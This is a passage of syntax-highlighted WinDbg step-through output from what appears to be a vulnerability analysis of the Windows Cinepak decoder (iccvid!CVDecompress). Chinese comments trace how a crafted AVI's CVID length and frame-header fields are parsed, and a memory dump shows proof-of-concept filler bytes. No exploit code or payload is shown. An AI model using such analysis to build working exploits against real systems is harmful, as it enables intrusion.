class="built_in">eip</span>=73b721c3 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x15</span>:</span><br><span class="line">73b721c3 741c            <span class="keyword">je</span>      iccvid!CVDecompress+<span class="number">0x33</span> (73b721e1)     [br=<span class="number">1</span>] <span class="comment">; 为0则跳转，这里跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0005e2c0 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b721e1 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x33</span>:</span><br><span class="line">73b721e1 33c0            <span class="keyword">xor</span>     <span class="built_in">eax</span>,<span class="built_in">eax</span>                                        <span class="comment">; eax = eax^eax = 0x00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0005e2c0 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b721e3 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x35</span>:</span><br><span class="line">73b721e3 837d1020        <span class="keyword">cmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">10h</span>],<span class="number">20h</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd40=<span class="number">00000068</span>  <span class="comment">; 判断a3是否小于0x20,a3为“idx1”索引块中读出的数据块的数据长度，与CVID数据长度应相等</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0005e2c0 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b721e7 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x39</span>:</span><br><span class="line">73b721e7 0f8200020000    <span class="keyword">jb</span>      iccvid!CVDecompress+<span class="number">0x23f</span> (73b723ed)    [br=<span class="number">0</span>] <span class="comment">; 小于则跳转,这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0005e2c0 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b721ed <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x3f</span>:</span><br><span class="line">73b721ed 8b750c          <span class="keyword">mov</span>     <span class="built_in">esi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">0Ch</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd3c=00ba68f8  <span class="comment">; esi = a2 = 0x00ba68f8,指向cinepak_codec_data1</span></span><br><span class="line"><span class="number">0</span>:<span class="number">011</span>&gt; <span class="built_in">dd</span> 00ba6af8</span><br><span class="line">00ba6af8  <span class="number">68000000</span> <span class="number">20016001</span> <span class="number">00101000</span> <span class="number">00001000</span></span><br><span class="line">00ba6b08  <span class="number">60000000</span> <span class="number">00206001</span> <span class="number">00110000</span> <span class="number">41411000</span></span><br><span class="line">00ba6b18  <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">00114141</span> <span class="number">41411000</span></span><br><span class="line">00ba6b28  <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">00114141</span> <span class="number">41411000</span></span><br><span class="line">00ba6b38  <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">00114141</span> <span class="number">00411000</span></span><br><span class="line">00ba6b48  <span class="number">31786469</span> <span class="number">00000010</span> <span class="number">63643030</span> <span class="number">00000010</span></span><br><span class="line">00ba6b58  <span class="number">00000004</span> <span class="number">00000068</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">00ba6b68  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0005e2c0 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00ba68f8 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b721f0 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x42</span>:</span><br><span class="line">73b721f0 8a6601          <span class="keyword">mov</span>     <span class="number">ah</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">1</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba68f9=<span class="number">00</span> <span class="comment">; ah = 0x00,CVID数据长度的第3个字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0005e2c0 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00ba68f8 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b721f3 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x45</span>:</span><br><span class="line">73b721f3 0fb64e03        <span class="keyword">movzx</span>   <span class="built_in">ecx</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">3</span>]       <span class="built_in">ds</span>:<span class="number">0023</span>:00ba68fb=<span class="number">68</span> <span class="comment">; ecx = 0x00000068,CVID数据长度的第1个字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000068</span> <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00ba68f8 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b721f7 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x49</span>:</span><br><span class="line">73b721f7 8a4602          <span class="keyword">mov</span>     <span class="built_in">al</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">2</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba68fa=<span class="number">00</span> <span class="comment">; al = 0x00,CVID数据长度的第2个字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000068</span> <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00ba68f8 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b721fa <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x4c</span>:</span><br><span class="line">73b721fa c1e008          <span class="keyword">shl</span>     <span class="built_in">eax</span>,<span class="number">8</span>                                          <span class="comment">; eax = 0x00000000,左移8位</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000068</span> <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00ba68f8 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b721fd <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x4f</span>:</span><br><span class="line">73b721fd 0bc1            <span class="keyword">or</span>      <span class="built_in">eax</span>,<span class="built_in">ecx</span>                                        <span class="comment">; 以大端读取CVID数据长度(Length of CVID data)</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000068</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000068</span> <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00ba68f8 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b721ff <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x51</span>:</span><br><span class="line">73b721ff <span class="number">394510</span>          <span class="keyword">cmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">10h</span>],<span class="built_in">eax</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd40=<span class="number">00000068</span> <span class="comment">; a3为从“idx1”索引块中读出的数据块的数据长度,eax为从对应的数据块中读出的数据长度,这里判断它们是否相同</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000068</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000068</span> <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00ba68f8 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72202 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x54</span>:</span><br><span class="line">73b72202 0f8cec010000    <span class="keyword">jl</span>      iccvid!CVDecompress+<span class="number">0x246</span> (73b723f4)    [br=<span class="number">0</span>] <span class="comment">; 小于则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000068</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000068</span> <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00ba68f8 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72208 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x5a</span>:</span><br><span class="line">73b72208 8a0e            <span class="keyword">mov</span>     <span class="built_in">cl</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>]          <span class="built_in">ds</span>:<span class="number">0023</span>:00ba68f8=<span class="number">00</span> <span class="comment">; cl = 0x00,Flags(Frame Header)</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000068</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00ba68f8 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7220a <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x5c</span>:</span><br><span class="line">73b7220a 884d13          <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">13h</span>],<span class="built_in">cl</span>      <span class="built_in">ss</span>:<span class="number">0023</span>:025afd43=<span class="number">00</span> <span class="comment">; a3的最高字节,a3为“idx1”索引块中读出的数据块的数据长度，Length of CVID data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000068</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00ba68f8 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7220d <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x5f</span>:</span><br><span class="line">73b7220d 8d4df0          <span class="keyword">lea</span>     <span class="built_in">ecx</span>,[<span class="built_in">ebp</span>-<span class="number">10h</span>]</span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000068</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=025afd20 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00ba68f8 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72210 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x62</span>:</span><br><span class="line">73b72210 <span class="number">51</span>              <span class="keyword">push</span>    <span class="built_in">ecx</span>                                            <span class="comment">; arg3 = ecx = 0x025afd20,用于保存减去Frame Header的大小后,剩余的数据大小</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000068</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=025afd20 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00ba68f8 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72211 <span class="built_in">esp</span>=025afd00 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x63</span>:</span><br><span class="line">73b72211 6a0a            <span class="keyword">push</span>    <span class="number">0Ah</span>                                            <span class="comment">; arg2 = 0xA,Frame Header的大小</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000068</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=025afd20 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00ba68f8 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72213 <span class="built_in">esp</span>=025afcfc <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x65</span>:</span><br><span class="line">73b72213 <span class="number">50</span>              <span class="keyword">push</span>    <span class="built_in">eax</span>                                            <span class="comment">; arg1 = 0x00000068,CVID数据长度</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000068</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=025afd20 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00ba68f8 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72214 <span class="built_in">esp</span>=025afcf8 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x66</span>:</span><br><span class="line">73b72214 e86dffffff      <span class="keyword">call</span>    iccvid!ULongSub (73b72186)                     <span class="comment">; 如果arg1&gt;=arg2,则返回0,且计算出减去Frame Header的大小后,剩余的数据大小,否则返回一个负数</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0000005e <span class="built_in">edx</span>=025afd20 <span class="built_in">esi</span>=00ba68f8 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72219 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x6b</span>:</span><br><span class="line">73b72219 85c0            <span class="keyword">test</span>    <span class="built_in">eax</span>,<span class="built_in">eax</span>                                        <span class="comment">; eax = 0x0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0000005e <span class="built_in">edx</span>=025afd20 <span class="built_in">esi</span>=00ba68f8 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7221b <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x6d</span>:</span><br><span class="line">73b7221b 0f8cd3010000    <span class="keyword">jl</span>      iccvid!CVDecompress+<span class="number">0x246</span> (73b723f4)    [br=<span class="number">0</span>] <span class="comment">; 小于则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0000005e <span class="built_in">edx</span>=025afd20 <span class="built_in">esi</span>=00ba68f8 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72221 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x73</span>:</span><br><span class="line">73b72221 33c0            <span class="keyword">xor</span>     <span class="built_in">eax</span>,<span class="built_in">eax</span>                                        <span class="comment">; eax = eax^eax = 0x00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0000005e <span class="built_in">edx</span>=025afd20 <span class="built_in">esi</span>=00ba68f8 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72223 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x75</span>:</span><br><span class="line">73b72223 8a6608          <span class="keyword">mov</span>     <span class="number">ah</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">8</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6900=<span class="number">00</span> <span class="comment">; ah = 0x00,Number of coded strips的高位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0000005e <span class="built_in">edx</span>=025afd20 <span class="built_in">esi</span>=00ba68f8 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72226 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span 